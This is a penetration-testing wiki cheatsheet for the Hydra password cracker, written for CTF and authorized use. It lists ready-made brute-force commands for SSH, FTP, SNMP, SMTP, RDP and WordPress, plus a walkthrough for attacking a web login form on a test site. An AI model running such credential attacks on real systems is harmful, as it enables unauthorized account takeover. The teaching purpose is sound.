Hydra
=======

__Attention: The articles published on this wiki are for education purpose, to use during a CTF or for an authorized penetrationtest. By using the wiki, you've agreed to use this knowledge in an ethical way and do not evil in any perspective.__

[Hydra](https://github.com/vanhauser-thc/thc-hydra) is a parallelized network logon cracker built in various operating systems like Kali Linux, Parrot and other major penetration testing environments. Hydra works by using different approaches to perform brute-force attacks in order to guess the right username and password combination. Hydra is commonly used by penetration testers together with a set of programmes like crunch, cupp etc, which are used to generate wordlists. Hydra is then used to test the attacks using the wordlists that these programmes created. 

In the examples in this cheatsheet we use a variable for the IP address. This can be declared via the CLI as follows:
```bash
export ip=10.0.2.16
```

Bruteforce SSH
---------
```bash
hydra -L usernames.txt -P passwords.txt $ip ssh -t 4
```

Bruteforce FTP
---------
```bash
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
```

Bruteforce SNMP
---------
```bash
hydra -P password-file.txt -v $ip snmp
```

Bruteforce SMTP
---------
```bash
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
```

Bruteforce Windows Remote Desktop
---------
```bash
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

Bruteforce Wordpress login
---------
```bash
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```


Bruteforce login webpage
---------
Hydra supports bruteforce attacks on login webpages such as, social media login form, user banking login form, a router web based login, etc. Every login webpage that uses “http[s]-{get|post}-form” can be attacked with Hydra. 
To setup a bruteforce attack with Hydra some additional information is needed, for example we want to bruteforce the following login webpage: http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F.
Before we fire up hydra we should know some needed arguments such below:

  * Target : http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F
  * Login username : admin (if you don’t sure, bruteforce this with a list)
  * Password list : “The location of dictionary file list containing possible passwords.”
  * Form parameters : “For general, use tamper data or proxy to obtain form of request parameters. It's possible to capture these information as wel with the developer tools in the browser.”
  * Service module : http-post-form

When the login page is loaded, open the developer tools with F12 in your broswer. Open the network tab and there are only get request yet, because nothing was posted to the server.
Enter a username and password and press the logon button to submit the data.
![Developer tools](../img/hydra/hydra-webpage-login1.png?raw=true "Open developer tools")

As soon the data is send to the server a post request is send. This post variables can be found in the browser by opening the post request details and hitting the Request tab. In this tab the form data is shown with the form parameters which are needed to use with Hydra. According the details the following information is send with the payload. This data is needed to complete the http-post-form. In the Request payload the following data is shown: tfUName=user1&tfUPass=Password20
The username "user1" should be replaced with "^USER^" and the password "Password20" should be replaced with "^PASS^" so Hydra can adjust these variables while bruteforcing the webpage.
![Post variables](../img/hydra/hydra-webpage-login2.png?raw=true "Post data")

To setup the command it should look like the following command. 
```bash
hydra -l <username> -P <password list> <Target hostname> <service module> <post request parameters>
```
The post request parameters are two parameters in one argument. It exist out a part of the url and a part of the request payload which we have identified via the developer tools.

The collected data is shown in the table below to give an idea how the command should be setup.

| Argument                  | Collected data                                                                  |
| ------------------------- |---------------------------------------------------------------------------------|
| -l username               | -l admin                                                                        |
| -P password list          | -P /usr/share/wordlists/rockyou.txt                                             |
| Target hostname           | testasp.vulnweb.com/                                                            |
| service module            | http-post-form                                                                  |
| post request parameters   | "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"  |

Based on the colled=cted data the command should look like this:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
```
The -vV argument will show all usernames and passwords on screen.
The -f argument will stop Hydra as soon as Hydra succesfully has identified a correct username/password combination.

